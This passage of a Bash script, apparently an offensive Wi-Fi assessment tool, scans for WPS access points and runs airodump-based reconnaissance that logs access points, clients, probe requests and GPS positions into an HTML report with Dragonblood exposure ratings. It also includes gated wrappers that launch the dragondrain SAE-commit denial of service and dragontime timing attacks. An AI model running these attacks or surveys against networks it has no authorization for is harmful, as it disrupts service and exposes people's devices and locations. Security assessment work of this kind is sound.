			raw_size=${raw_size//[!0-9]/}
		fi
		if [[ -z "$raw_size" ]]; then raw_size=0; fi

		if ((raw_size < 50)); then
			print_log WARN SCAN "Check WiFi"
		else
			print_log INFO SCAN "#$SCAN_NUM raw $raw_size B"
		fi

		if [[ -z "${SCAN_RAW:-}" || -z "${SCAN_TARGETS:-}" ]]; then
			print_log ERROR SCAN "No scan"
			sleep "${COOLDOWN:-5}" || true
			continue
		fi

		parse_scan "$SCAN_RAW" "$SCAN_TARGETS" || print_log WARN SCAN "Parse failed"

		local cnt=0
		if [[ -s "$SCAN_TARGETS" ]]; then
			cnt=$(wc -l <"$SCAN_TARGETS" 2>/dev/null) || cnt=0
			cnt=${cnt//[!0-9]/}
		fi
		if [[ -z "$cnt" ]]; then cnt=0; fi

		APS_SEEN=$((${APS_SEEN:-0} + cnt))
		if ((cnt == 0)); then
			print_log WARN SCAN "No WPS"
		else
			print_log OK SCAN "#$SCAN_NUM: $cnt WPS APs"
		fi

		if location_is_enabled 2>/dev/null && [[ -s "${SCAN_TARGETS:-}" ]]; then
			location_ingest_scan_targets "$SCAN_TARGETS" "${SCAN_NUM:-0}" 2>/dev/null || true
		fi

		local done=0
		if [[ -s "$SCAN_TARGETS" ]]; then
			while IFS=$'\036' read -r line_bssid line_essid line_sig line_ver line_ap_locked line_sel_reg line_wpa3 line_pmf line_dpp line_wps_hidden line_wps_state line_cfg_methods line_tkip line_wpa1 line_dpp_ver line_dpp_conf line_dpp_pkex line_psk line_owe line_channel line_dpid line_maker line_model line_fw line_devname line_serial line_uuid line_rsn_caps line_akm_list line_rsn_gw line_rsn_pw line_rsn_gm line_rsnxe_list line_extcap_list line_owe_tm line_td_bitmap line_rsnxe_cap_hex line_he_present line_he_capabilities_present line_he_operation_present line_he_bss_color line_he_twt_supported line_he_ul_mu_mimo line_he_dl_mu_mimo line_he_ul_ofdma line_he_dl_ofdma line_he_160mhz line_he_80p80 line_he_spatial_streams line_he_raw_capabilities_hex line_eht_present line_eht_capabilities_present line_eht_operation_present line_eht_320mhz line_eht_puncturing_supported line_eht_mlo_supported line_eht_mlo_ap line_eht_spatial_streams line_eht_mcs_max line_eht_raw_capabilities_hex || [[ -n "$line_bssid" ]]; do
				if [[ -z "$line_bssid" ]]; then continue; fi
				if [[ ! "$line_bssid" =~ ^[0-9a-fA-F]{1,2}(:[0-9a-fA-F]{1,2}){5}$ ]]; then continue; fi
				done=$((${done:-0} + 1))
				if ((done > ${MAX_TARGETS:-20})); then break; fi
				process_target "$line_bssid" "$line_essid" "$line_sig" "$line_ver" "${line_channel:-1}" \
					"$line_ap_locked" "$line_sel_reg" "$line_wpa3" "$line_pmf" "$line_dpp" "$line_wps_hidden" \
					"$line_wps_state" "$line_cfg_methods" "$line_tkip" "$line_wpa1" \
					"$line_dpp_ver" "$line_dpp_conf" "$line_dpp_pkex" "${line_psk:-NO}" "${line_owe:-NO}" \
					"${line_dpid:-unknown}" "${line_maker:-}" "${line_model:-}" "${line_fw:-}" \
					"${line_devname:-}" "${line_serial:-}" "${line_uuid:-}" "${line_rsn_caps:-NO}" "${line_akm_list:-}" "${line_rsn_gw:-}" "${line_rsn_pw:-}" "${line_rsn_gm:-}" "${line_rsnxe_list:-}" "${line_extcap_list:-}" "${line_owe_tm:-NO}" "${line_td_bitmap:-}" "${line_rsnxe_cap_hex:-}" \
					"${line_he_present:-}" "${line_he_capabilities_present:-}" "${line_he_operation_present:-}" \
					"${line_he_bss_color:-}" "${line_he_twt_supported:-}" "${line_he_ul_mu_mimo:-}" "${line_he_dl_mu_mimo:-}" \
					"${line_he_ul_ofdma:-}" "${line_he_dl_ofdma:-}" "${line_he_160mhz:-}" "${line_he_80p80:-}" \
					"${line_he_spatial_streams:-}" "${line_he_raw_capabilities_hex:-}" \
					"${line_eht_present:-}" "${line_eht_capabilities_present:-}" "${line_eht_operation_present:-}" \
					"${line_eht_320mhz:-}" "${line_eht_puncturing_supported:-}" "${line_eht_mlo_supported:-}" "${line_eht_mlo_ap:-}" \
					"${line_eht_spatial_streams:-}" "${line_eht_mcs_max:-}" "${line_eht_raw_capabilities_hex:-}" || true
			done <"$SCAN_TARGETS" || true
		fi

		if ((cnt > 0)); then
			make_report || true
		fi

		print_log INFO WAIT "Sleep ${COOLDOWN}s"
		sleep "$COOLDOWN" || true
	done
}

function _recon_uptime_fmt() {
	local s="${1:-}"
	[[ "$s" =~ ^[0-9]+$ ]] || {
		printf ''
		return 0
	}
	((s > 0)) || {
		printf ''
		return 0
	}
	local d=$((s / 86400)) h=$(((s % 86400) / 3600)) m=$(((s % 3600) / 60))
	if ((d > 0)); then
		printf '%dd %dh' "$d" "$h"
	elif ((h > 0)); then
		printf '%dh %dm' "$h" "$m"
	else
		printf '%dm' "$m"
	fi
	return 0
}

function _recon_embed_png() {
	local p="${1:-}" label="${2:-}" b64=""
	[[ -n "$p" && -r "$p" && -s "$p" ]] || return 0
	b64=$(base64 -w0 "$p" 2>/dev/null) || b64=""
	[[ -n "$b64" ]] || b64=$(base64 "$p" 2>/dev/null | tr -d '\r\n') || b64=""
	[[ -n "$b64" ]] || return 0
	printf '<figure class="g"><img alt="%s" src="data:image/png;base64,%s"><figcaption>%s</figcaption></figure>' "$label" "$b64" "$label"
	return 0
}

# Dragonblood posture (Vanhoef & Ronen, IEEE S&P 2020) from airodump Privacy/Auth.
# Passive classification only. Echoes "SEV|exposure|ref|fix" or empty.
function _dragonblood_from_auth() {
	local auth up has_sae=0 has_psk=0
	up="$(printf '%s' "${2:-}" | tr '[:lower:]' '[:upper:]')"
	[[ "$up" == *SAE* ]] && has_sae=1
	[[ "$up" == *PSK* ]] && has_psk=1
	if ((has_sae == 1 && has_psk == 1)); then
		printf 'HIGH|WPA3 transition mode (SAE+PSK): forced WPA2 downgrade then offline dictionary|Dragonblood IV-A; CVE-2019-9494 class|Split WPA2/WPA3 SSIDs or disable transition mode; require PMF'
		return 0
	fi
	if ((has_sae == 1)); then
		printf 'MEDIUM|WPA3-SAE: timing side-channel and SAE-commit DoS exposure|Dragonblood V / IV-B; CVE-2019-9494 / 13377|H2E-only + patched AP/supplicant; mandatory PMF; avoid MODP groups 22/23/24'
		return 0
	fi
	printf ''
	return 0
}

function sae_dos_dragondrain() {
	local b="${1:-}" ch="${2:-}"
	[[ "${ENABLE_SAE_DOS:-0}" == "1" ]] || {
		log_attempt "$b" "sae_dos" "SKIP" "disabled (ENABLE_SAE_DOS=0)"
		return 1
	}
	active_attack_permitted "$b" || {
		log_attempt "$b" "sae_dos" "SKIP" "not in ACTIVE allowlist"
		return 1
	}
	command -v "$DRAGON_DOS_TOOL" >/dev/null 2>&1 || {
		log_attempt "$b" "sae_dos" "FAIL" "$DRAGON_DOS_TOOL missing"
		return 1
	}
	ensure_mode monitor || return 1
	print_log WARN SAEDOS "$b SAE-commit DoS (authorized, ${SAE_DOS_SECS}s)"
	timeout --kill-after=5 -- "${SAE_DOS_SECS:-20}" "$DRAGON_DOS_TOOL" "$IFACE" "$b" ${ch:+"$ch"} >/dev/null 2>&1 || true
	ensure_mode managed 2>/dev/null || true
	log_attempt "$b" "sae_dos" "DONE" "dragondrain ${SAE_DOS_SECS}s"
	return 0
}

function sae_timing_dragontime() {
	local b="${1:-}" ch="${2:-}"
	[[ "${ENABLE_SAE_TIMING:-0}" == "1" ]] || {
		log_attempt "$b" "sae_timing" "SKIP" "disabled (ENABLE_SAE_TIMING=0)"
		return 1
	}
	active_attack_permitted "$b" || {
		log_attempt "$b" "sae_timing" "SKIP" "not in ACTIVE allowlist"
		return 1
	}
	command -v "$DRAGON_TIME_TOOL" >/dev/null 2>&1 || {
		log_attempt "$b" "sae_timing" "FAIL" "$DRAGON_TIME_TOOL missing"
		return 1
	}
	ensure_mode monitor || return 1
	print_log WARN SAETIME "$b SAE timing measurement (authorized, ${SAE_TIMING_SECS}s)"
	timeout --kill-after=5 -- "${SAE_TIMING_SECS:-25}" "$DRAGON_TIME_TOOL" "$IFACE" "$b" ${ch:+"$ch"} >/dev/null 2>&1 || true
	ensure_mode managed 2>/dev/null || true
	log_attempt "$b" "sae_timing" "DONE" "dragontime ${SAE_TIMING_SECS}s (offline recovery is a separate step)"
	return 0
}

function recon_report() {
	local csv="$1" kcsv="$2" out="$3" uptime_file="${4:-}" capr_png="${5:-}" cpg_png="${6:-}" op_fix="${7:-}" skip_file="${8:-}"
	[[ -n "$out" ]] || return 1
	if [[ -z "$csv" || ! -r "$csv" || ! -s "$csv" ]]; then
		print_log WARN RECON "No CSV data"
		return 1
	fi

	local tmpd
	tmpd="$(mktemp -d "${TMPDIR:-/tmp}/cprecon.XXXXXX")" || return 1
	local ap_recs="${tmpd}/ap" sta_recs="${tmpd}/sta" gps_recs="${tmpd}/gps"
	: >"$ap_recs" 2>/dev/null || true
	: >"$sta_recs" 2>/dev/null || true
	: >"$gps_recs" 2>/dev/null || true

	awk -v apf="$ap_recs" -v staf="$sta_recs" '
	function trim(s){gsub(/^[ \t]+|[ \t]+$/,"",s);return s}
	function is_mac(s,  t,c){s=toupper(s);if(s!~/^[0-9A-F:]+$/)return 0;t=s;c=gsub(/:/,"@",t);return c==5}
	{
		sub(/\r$/,"")
		l=$0; gsub(/^[ \t]+/,"",l)
		if(l ~ /^BSSID[ \t]*,/){sec=1;next}
		if(l ~ /^Station MAC[ \t]*,/){sec=2;next}
		if(l ~ /^[ \t]*$/){next}
		n=split($0,f,",")
		if(sec==1){
			if(n<14)next
			bssid=toupper(trim(f[1]))
			if(!is_mac(bssid))next
			first=trim(f[2]);last=trim(f[3]);ch=trim(f[4])
			priv=trim(f[6]);ciph=trim(f[7]);auth=trim(f[8]);pow=trim(f[9])
			beac=trim(f[10]);data=trim(f[11])
			essid=trim(f[14])
			if(n>15){for(i=15;i<n;i++)essid=essid "," f[i]}
			print bssid"\036"ch"\036"pow"\036"priv"\036"ciph"\036"auth"\036"beac"\036"data"\036"first"\036"last"\036"essid > apf
		}else if(sec==2){
			if(n<6)next
			sta=toupper(trim(f[1]))
			if(!is_mac(sta))next
			pow=trim(f[4]);pkts=trim(f[5]);assoc=toupper(trim(f[6]))
			probes=""
			if(n>=7){probes=trim(f[7]);for(i=8;i<=n;i++)probes=probes "," f[i]}
			print sta"\036"assoc"\036"pow"\036"pkts"\036"probes > staf
		}
	}' "$csv" 2>/dev/null || true

	if [[ -n "$kcsv" && -r "$kcsv" && -s "$kcsv" ]]; then
		awk -v gpsf="$gps_recs" '
		function trim(s){gsub(/^[ \t]+|[ \t]+$/,"",s);return s}
		BEGIN{FS=";"}
		NR==1{
			for(i=1;i<=NF;i++)h[i]=tolower(trim($i))
			for(i=1;i<=NF;i++)if(h[i]~/bssid/){bc=i;break}
			for(i=1;i<=NF;i++)if(h[i]=="gpsbestlat"){latc=i;break}
			for(i=1;i<=NF;i++)if(h[i]=="gpsbestlon"){lonc=i;break}
			if(!latc)for(i=1;i<=NF;i++)if(h[i]~/lat/&&h[i]!~/min|max/){latc=i;break}
			if(!lonc)for(i=1;i<=NF;i++)if(h[i]~/lon/&&h[i]!~/min|max/){lonc=i;break}
			if(!latc)for(i=1;i<=NF;i++)if(h[i]~/lat/){latc=i;break}
			if(!lonc)for(i=1;i<=NF;i++)if(h[i]~/lon/){lonc=i;break}
			next
		}
		{
			sub(/\r$/,"")
			if(!bc)next
			b=toupper(trim($bc))
			if(b!~/^[0-9A-F:]{17}$/)next
			lat=(latc?trim($latc):"");lon=(lonc?trim($lonc):"")
			if(lat==""||lon=="")next
			if(lat+0==0&&lon+0==0)next
			print b"\036"lat"\036"lon > gpsf
		}' "$kcsv" 2>/dev/null || true
	fi

	local -A gps_lat=() gps_lon=() ap_name=()
	local _gb _glat _glon
	while IFS=$'\036' read -r _gb _glat _glon; do
		[[ -n "$_gb" ]] || continue
		gps_lat["$_gb"]="$_glat"
		gps_lon["$_gb"]="$_glon"
	done <"$gps_recs"


	local -A _apnew=()
	RECON_NEW_BSSIDS=""
	local -a ap_b=() ap_c=() ap_p=() ap_pr=() ap_ci=() ap_au=() ap_be=() ap_da=() ap_es=()
	local b1 c1 p1 pr1 ci1 au1 be1 da1 fi1 la1 es1
	while IFS=$'\036' read -r b1 c1 p1 pr1 ci1 au1 be1 da1 fi1 la1 es1; do
		[[ -n "$b1" ]] || continue
		ap_name["$b1"]="$es1"
		if [[ -n "$skip_file" ]] && report_state_seen "$skip_file" "$b1"; then continue; fi
		[[ -n "$skip_file" ]] && {
			_apnew["$b1"]=1
			RECON_NEW_BSSIDS+="${b1} "
		}
		ap_b+=("$b1"); ap_c+=("$c1"); ap_p+=("$p1"); ap_pr+=("$pr1"); ap_ci+=("$ci1")
		ap_au+=("$au1"); ap_be+=("$be1"); ap_da+=("$da1"); ap_es+=("$es1")
	done <"$ap_recs"

	local -a st_s=() st_a=() st_p=() st_k=() st_pr=()
	local s1 a1 sp1 sk1 spr1
	while IFS=$'\036' read -r s1 a1 sp1 sk1 spr1; do
		[[ -n "$s1" ]] || continue
		if [[ -n "$skip_file" && -n "$a1" && "$a1" != *"NOT ASSOCIATED"* ]]; then
			[[ -n "${_apnew[$a1]:-}" ]] || continue
		fi
		st_s+=("$s1"); st_a+=("$a1"); st_p+=("$sp1"); st_k+=("$sk1"); st_pr+=("$spr1")
	done <"$sta_recs"

	local -A up_map=()
	if [[ -n "$uptime_file" && -r "$uptime_file" ]]; then
		local _ub _us
		while IFS=$'\t' read -r _ub _us; do
			[[ -n "$_ub" ]] || continue
			up_map["$_ub"]="$_us"
		done <"$uptime_file"
	fi

	local n_ap=${#ap_b[@]} n_sta=${#st_s[@]} n_gps=${#gps_lat[@]}


	if [[ -n "$skip_file" && "$n_ap" -eq 0 ]]; then
		print_log INFO RECON "skip: no new networks"
		rm -rf -- "$tmpd" 2>/dev/null || true
		RECON_NEW_BSSIDS=""
		return 2
	fi


	local -a db_sev=() db_ess=() db_bss=() db_label=() db_ref=() db_fix=()
	if [[ "${ENABLE_DRAGONBLOOD_POSTURE:-1}" == "1" ]]; then
		local _di _dres _s _l _r _f
		for ((_di = 0; _di < ${#ap_b[@]}; _di++)); do
			_dres="$(_dragonblood_from_auth "${ap_pr[_di]}" "${ap_au[_di]}")"
			[[ -n "$_dres" ]] || continue
			IFS='|' read -r _s _l _r _f <<<"$_dres"
			db_sev+=("$_s")
			db_label+=("$_l")
			db_ref+=("$_r")
			db_fix+=("$_f")
			db_bss+=("${ap_b[_di]}")
			db_ess+=("${ap_es[_di]}")
		done
	fi
	local n_db=${#db_bss[@]}

	local kb_on=0
	vendor_kb_available && kb_on=1
	local now_dot
	now_dot="$(date +'%Y.%m.%d %H:%M:%S')" || now_dot=""

	local rc=0
	{
		printf '<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Recon &mdash; %s</title>' "$TOOL_NAME"
		cat <<-'CSS'
			<style>
			:root{--bg:#eef1f6;--panel:#fff;--ink:#111827;--muted:#5b6472;--line:#e5e8ef;--acc:#2563eb}
			@media(prefers-color-scheme:dark){:root{--bg:#0f172a;--panel:#111827;--ink:#e8edf6;--muted:#94a3b8;--line:#1f2a3a;--acc:#60a5fa}}
			*{box-sizing:border-box}
			body{margin:0;background:var(--bg);color:var(--ink);font:14px/1.5 -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif}
			.wrap{max-width:1100px;margin:0 auto;padding:16px}
			.hero{background:linear-gradient(135deg,#0f172a,#1e293b);color:#e8edf6;border-radius:14px;padding:18px 20px}
			.hero h1{margin:0 0 4px;font-size:19px}
			.hero .sub{color:#aab6c8;font-size:12px}
			.cards{display:grid;grid-template-columns:repeat(auto-fit,minmax(120px,1fr));gap:10px;margin:14px 0}
			.card{background:var(--panel);border:1px solid var(--line);border-radius:12px;padding:12px 14px}
			.card .n{font-size:22px;font-weight:800}
			.card .l{font-size:11px;text-transform:uppercase;letter-spacing:.05em;color:var(--muted)}
			h2{font-size:14px;margin:18px 0 8px;text-transform:uppercase;letter-spacing:.05em;color:var(--muted)}
			.panel{background:var(--panel);border:1px solid var(--line);border-radius:12px;overflow:auto}
			table{width:100%;border-collapse:collapse;font-size:13px}
			th,td{padding:8px 10px;text-align:left;border-bottom:1px solid var(--line);white-space:nowrap}
			th{font-size:10px;text-transform:uppercase;letter-spacing:.05em;color:var(--muted);background:rgba(127,127,127,.06)}
			td.mono,.mono{font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;font-size:12px}
			td.wrap{white-space:normal;max-width:280px}
			tr:last-child td{border-bottom:0}
			.muted{color:var(--muted)}
			.empty{padding:16px;color:var(--muted);font-size:13px}
			footer{margin:18px 0 6px;color:var(--muted);font-size:11px}
			a{color:var(--acc)}
			.graphs{display:flex;flex-wrap:wrap;gap:16px}
			.g{margin:0;max-width:100%}
			.g img{max-width:100%;height:auto;border:1px solid var(--line);border-radius:8px;background:#fff}
			.g figcaption{font-size:11px;color:var(--muted);margin-top:4px}
			@media print{body{background:#fff}.hero{background:#0f172a}}
			</style>
		CSS
		printf '</head><body><div class="wrap">'
		printf '<div class="hero"><h1>Wi-Fi reconnaissance survey</h1><div class="sub">%s v%s &middot; %s &middot; passive recon (authorized)</div></div>' "$TOOL_NAME" "$VERSION" "${now_dot:-}"
		printf '<div class="cards"><div class="card"><div class="n">%s</div><div class="l">Access points</div></div><div class="card"><div class="n">%s</div><div class="l">Clients</div></div><div class="card"><div class="n">%s</div><div class="l">With GPS</div></div></div>' "$n_ap" "$n_sta" "$n_gps"

		if [[ -n "$op_fix" ]]; then
			local _of_lat _of_lon _of_acc _of_src
			IFS=' ' read -r _of_lat _of_lon _of_acc _of_src <<<"$op_fix"
			if [[ -n "$_of_lat" && -n "$_of_lon" ]]; then
				printf '<div class="panel" style="padding:12px 14px;margin:0 0 4px"><b>Survey location</b> (operator fix via %s): <a href="geo:%s,%s">%s, %s</a>%s</div>' \
					"$(_html_escape "${_of_src:-?}")" "$(_html_escape "$_of_lat")" "$(_html_escape "$_of_lon")" \
					"$(_html_escape "$_of_lat")" "$(_html_escape "$_of_lon")" \
					"$([[ -n "$_of_acc" && "$_of_acc" != "?" ]] && printf ' &plusmn;%sm' "$(_html_escape "$_of_acc")")"
			fi
		fi

		printf '<h2>Access points</h2>'
		if ((n_ap == 0)); then
			printf '<div class="panel"><div class="empty">No access points captured.</div></div>'
		else
			printf '<div class="panel"><table><thead><tr><th>#</th><th>BSSID</th><th>Vendor</th><th>ESSID</th><th>Ch</th><th>Pwr</th><th>Privacy</th><th>Cipher</th><th>Auth</th><th>Beacons</th><th>Data</th><th>Uptime</th><th>GPS</th></tr></thead><tbody>'
			local i vid name essid_disp gcell lat lon up_disp
			for ((i = 0; i < n_ap; i++)); do
				vid=""
				name=""
				if ((kb_on == 1)); then
					vid=$(vendor_kb_lookup_oui "${ap_b[i]}") || vid=""
					if [[ -n "$vid" ]]; then name=$(vendor_kb_vendor_name "$vid") || name=""; fi
				fi
				[[ -n "$name" ]] || name="&mdash;"
				essid_disp="${ap_es[i]}"
				[[ -n "$essid_disp" && "$essid_disp" != "<hidden>" ]] || essid_disp="hidden"
				gcell='<span class="muted">&mdash;</span>'
				lat="${gps_lat[${ap_b[i]}]:-}"
				lon="${gps_lon[${ap_b[i]}]:-}"
				if [[ -n "$lat" && -n "$lon" ]]; then
					gcell="$(printf '<a href="geo:%s,%s">%s, %s</a>' "$(_html_escape "$lat")" "$(_html_escape "$lon")" "$(_html_escape "$lat")" "$(_html_escape "$lon")")"
				fi
				up_disp="$(_recon_uptime_fmt "${up_map[${ap_b[i]}]:-}")" || up_disp=""
				[[ -n "$up_disp" ]] || up_disp='<span class="muted">&mdash;</span>'
				printf '<tr><td>%s</td><td class="mono">%s</td><td>%s</td><td class="wrap">%s</td><td>%s</td><td>%s</td><td>%s</td><td>%s</td><td>%s</td><td>%s</td><td>%s</td><td>%s</td><td class="mono">%s</td></tr>' \
					"$((i + 1))" \
					"$(_html_escape "${ap_b[i]}")" \
					"$name" \
					"$(_html_escape "$essid_disp")" \
					"$(_html_escape "${ap_c[i]}")" \
					"$(_html_escape "${ap_p[i]}")" \
					"$(_html_escape "${ap_pr[i]}")" \
					"$(_html_escape "${ap_ci[i]}")" \
					"$(_html_escape "${ap_au[i]}")" \
					"$(_html_escape "${ap_be[i]}")" \
					"$(_html_escape "${ap_da[i]}")" \
					"$up_disp" \
					"$gcell"
			done
			printf '</tbody></table></div>'
		fi

		if ((n_db > 0)); then
			printf '<h2>WPA3 / SAE exposure (Dragonblood)</h2><div class="panel"><table><thead><tr><th>#</th><th>ESSID</th><th>BSSID</th><th>Exposure</th><th>Severity</th><th>Ref</th><th>Fix</th></tr></thead><tbody>'
			local _dj
			for ((_dj = 0; _dj < n_db; _dj++)); do
				printf '<tr><td>%s</td><td class="wrap">%s</td><td class="mono">%s</td><td class="wrap">%s</td><td>%s</td><td class="wrap">%s</td><td class="wrap">%s</td></tr>' \
					"$((_dj + 1))" \
					"$(_html_escape "${db_ess[_dj]}")" \
					"$(_html_escape "${db_bss[_dj]}")" \
					"$(_html_escape "${db_label[_dj]}")" \
					"$(_html_escape "${db_sev[_dj]}")" \
					"$(_html_escape "${db_ref[_dj]}")" \
					"$(_html_escape "${db_fix[_dj]}")"
			done
			printf '</tbody></table></div>'
		fi

		printf '<h2>Clients</h2>'
		if ((n_sta == 0)); then
			printf '<div class="panel"><div class="empty">No clients captured.</div></div>'
		else
			printf '<div class="panel"><table><thead><tr><th>#</th><th>Station</th><th>Vendor</th><th>Associated</th><th>Pwr</th><th>Pkts</th><th>Probes</th></tr></thead><tbody>'
			local j vid2 name2 assoc_disp pr_disp an
			for ((j = 0; j < n_sta; j++)); do
				vid2=""
				name2=""
				if ((kb_on == 1)); then
					vid2=$(vendor_kb_lookup_oui "${st_s[j]}") || vid2=""
					if [[ -n "$vid2" ]]; then name2=$(vendor_kb_vendor_name "$vid2") || name2=""; fi
				fi
				[[ -n "$name2" ]] || name2="&mdash;"
				assoc_disp="${st_a[j]}"
				if [[ -z "$assoc_disp" || "$assoc_disp" == *"NOT ASSOCIATED"* ]]; then
					assoc_disp='<span class="muted">not associated</span>'
				else
					an="${ap_name[$assoc_disp]:-}"
					if [[ -n "$an" && "$an" != "<hidden>" ]]; then
						assoc_disp="$(printf '%s <span class="muted mono">(%s)</span>' "$(_html_escape "$an")" "$(_html_escape "${st_a[j]}")")"
					else
						assoc_disp="$(printf '<span class="mono">%s</span>' "$(_html_escape "${st_a[j]}")")"
					fi
				fi
				pr_disp="${st_pr[j]}"
				[[ -n "$pr_disp" ]] || pr_disp="&mdash;"
				[[ "$pr_disp" == "&mdash;" ]] || pr_disp="$(_html_escape "$pr_disp")"
				printf '<tr><td>%s</td><td class="mono">%s</td><td>%s</td><td>%s</td><td>%s</td><td>%s</td><td class="wrap">%s</td></tr>' \
					"$((j + 1))" \
					"$(_html_escape "${st_s[j]}")" \
					"$name2" \
					"$assoc_disp" \
					"$(_html_escape "${st_p[j]}")" \
					"$(_html_escape "${st_k[j]}")" \
					"$pr_disp"
			done
			printf '</tbody></table></div>'
		fi

		local g_capr g_cpg
		g_capr="$(_recon_embed_png "$capr_png" "AP &harr; clients (CAPR)")" || g_capr=""
		g_cpg="$(_recon_embed_png "$cpg_png" "clients &harr; probes (CPG)")" || g_cpg=""
		if [[ -n "$g_capr" || -n "$g_cpg" ]]; then
			printf '<h2>Connection graphs</h2><div class="panel" style="padding:12px"><div class="graphs">%s%s</div></div>' "$g_capr" "$g_cpg"
		fi

		printf '<footer>Generated by %s v%s. Passive reconnaissance of authorized networks only. No frames were injected.</footer>' "$TOOL_NAME" "$VERSION"
		printf '</div></body></html>'
	} >"${out}.tmp" 2>/dev/null || rc=1

	if [[ "$rc" == 0 && -s "${out}.tmp" ]]; then
		mv -f "${out}.tmp" "$out" 2>/dev/null || rc=1
	else
		rm -f "${out}.tmp" 2>/dev/null || true
		rc=1
	fi

	rm -rf -- "$tmpd" 2>/dev/null || true
	return "$rc"
}

function run_recon() {
	if [[ "${_RECON_RUNNING:-0}" == "1" ]]; then
		print_log WARN RECON "Already running, skip"
		return 1
	fi
	_RECON_RUNNING=1

	if ! command -v airodump-ng >/dev/null 2>&1; then
		print_log ERROR RECON "No airodump-ng"
		_RECON_RUNNING=0
		return 1
	fi

	local secs="${RECON_SECS:-60}"
	[[ "$secs" =~ ^[0-9]+$ ]] || secs=60
	((secs < 5)) && secs=5
	((secs > 3600)) && secs=3600

	if ! ensure_mode monitor; then
		print_log ERROR RECON "No monitor"
		_RECON_RUNNING=0
		return 1
	fi

	local stamp prefix
	stamp="$(date +%Y%m%d_%H%M%S)" || stamp="$$"
	prefix="${LOG_DIR}/recon_${stamp}"


	local gps_pid="" feed_pid="" use_gpsd=0
	RECON_OP_FIX=""
	if [[ "${RECON_GPS:-0}" == "1" ]]; then
		if location_fix; then
			RECON_OP_FIX="$LOCATION_FIX_RESULT"
			if command -v gpsd >/dev/null 2>&1; then
				local _np="${LOCATION_NMEA_PORT:-2947}"
				feed_pid="$(location_nmea_feeder 127.0.0.1 "$_np" || true)"
				if [[ -n "$feed_pid" ]]; then
					BG_PIDS+=("$feed_pid")
					gpsd -N -n "udp://127.0.0.1:${_np}" >/dev/null 2>&1 &
					gps_pid=$!
					BG_PIDS+=("$gps_pid")
					use_gpsd=1
					print_log INFO RECON "GPS on (feeder -> gpsd :$_np)"
				elif command -v gpspipe >/dev/null 2>&1; then
					gpsd -N "${RECON_GPSD_SRC:-udp://*:2947}" >/dev/null 2>&1 &
					gps_pid=$!
					BG_PIDS+=("$gps_pid")
					use_gpsd=1
					print_log INFO RECON "GPS on (existing gpsd source)"
				fi
			fi
			[[ "$use_gpsd" == "0" ]] && print_log INFO RECON "GPS fix stamped in report (no gpsd per-AP tagging)"
		else
			print_log WARN RECON "GPS unavailable — recon runs without coordinates"
		fi
	fi

	local -a cmd=(airodump-ng "$IFACE" -w "$prefix" --output-format pcap,csv,kismet --write-interval 1 --manufacturer --wps --uptime)
	[[ "$use_gpsd" == "1" ]] && cmd+=(--gpsd)
	[[ -n "${RECON_BAND:-}" ]] && cmd+=(--band "$RECON_BAND")

	if airodump-ng --help 2>&1 | grep -q -- '--background'; then
		cmd+=(--background 1)
	fi


	print_log INFO RECON "Capture start ${secs}s iface=$IFACE"
	local dump_pid="" dump_rc=0 t0=$SECONDS dur=0
	timeout --kill-after="${RECON_KILL_AFTER:-5}" -- "$secs" "${cmd[@]}" </dev/null >/dev/null 2>&1 &
	dump_pid=$!
	BG_PIDS+=("$dump_pid")
	# Track airodump itself (child of the timeout wrapper) so an interrupt that
	# kills the wrapper cannot leave an orphaned capture process behind.
	if command -v pgrep >/dev/null 2>&1; then
		local _adc _try
		for _try in 1 2 3; do
			_adc="$(pgrep -P "$dump_pid" 2>/dev/null | head -n1)" || _adc=""
			[[ -n "$_adc" ]] && {
				BG_PIDS+=("$_adc")
				break
			}
			sleep 0.2
		done
	fi
	wait "$dump_pid" || dump_rc=$?
	dur=$((SECONDS - t0))
	case "$dump_rc" in
	0) print_log INFO RECON "Capture ended early ${dur}s" ;;
	124) print_log INFO RECON "Capture window done ${dur}s" ;;
	137 | 265) print_log WARN RECON "Capture SIGKILL ${dur}s" ;;
	*) print_log WARN RECON "Capture rc=$dump_rc ${dur}s" ;;
	esac

	local _gp
	for _gp in "$feed_pid" "$gps_pid"; do
		if [[ -n "$_gp" ]]; then
			kill "$_gp" 2>/dev/null || true
			wait "$_gp" 2>/dev/null || true
		fi
	done

	ensure_mode managed 2>/dev/null || true

	local csv kcsv out pcap
	csv="${prefix}-01.csv"
	kcsv="${prefix}-01.kismet.csv"
	pcap="${prefix}-01.cap"
	out="${LOG_DIR}/report_recon_${stamp}.html"

	local uptime_file=""
	if command -v tshark >/dev/null 2>&1; then
		if [[ -r "$pcap" && -s "$pcap" ]]; then
			uptime_file="${prefix}-uptime.tsv"
			timeout --kill-after=5 -- 60 tshark -r "$pcap" -n -Y 'wlan.fc.type_subtype==0x08||wlan.fc.type_subtype==0x05' \
				-T fields -e wlan.bssid -e wlan.fixed.timestamp 2>/dev/null |
				awk -F'\t' '$1!=""&&$2~/^[0-9]+$/{b=toupper($1);t=$2+0;if(t>mx[b])mx[b]=t}END{for(b in mx)printf "%s\t%d\n",b,int(mx[b]/1000000)}' \
					>"$uptime_file" 2>/dev/null || : >"$uptime_file"
			[[ -s "$uptime_file" ]] || uptime_file=""
		fi
	else
		print_log INFO RECON "No tshark"
	fi

	local capr_png="" cpg_png=""
	if command -v airgraph-ng >/dev/null 2>&1; then
		capr_png="${prefix}-CAPR.png"
		cpg_png="${prefix}-CPG.png"
		timeout --kill-after=5 -- 90 airgraph-ng -i "$csv" -g CAPR -o "$capr_png" >/dev/null 2>&1 || true
		timeout --kill-after=5 -- 90 airgraph-ng -i "$csv" -g CPG -o "$cpg_png" >/dev/null 2>&1 || true
		[[ -s "$capr_png" ]] || capr_png=""
		[[ -s "$cpg_png" ]] || cpg_png=""
	else
		print_log INFO RECON "No airgraph"
	fi

	print_log INFO RECON "Parsing capture"
	_RECON_RUNNING=0

	local _skip=""
	[[ "${ENABLE_REPORT_DEDUP:-1}" == "1" ]] && _skip="${REPORT_STATE_RECON:-}"
	local _rr=0
	recon_report "$csv" "$kcsv" "$out" "$uptime_file" "$capr_png" "$cpg_png" "${RECON_OP_FIX:-}" "$_skip" || _rr=$?
	case "$_rr" in
	0)
		# report written -> commit the new networks to recon history
		if [[ -n "$_skip" && -n "${RECON_NEW_BSSIDS:-}" ]]; then
			local -a _nb=()
			IFS=' ' read -r -a _nb <<<"$RECON_NEW_BSSIDS"
			report_state_add "$_skip" "${_nb[@]}"
		fi
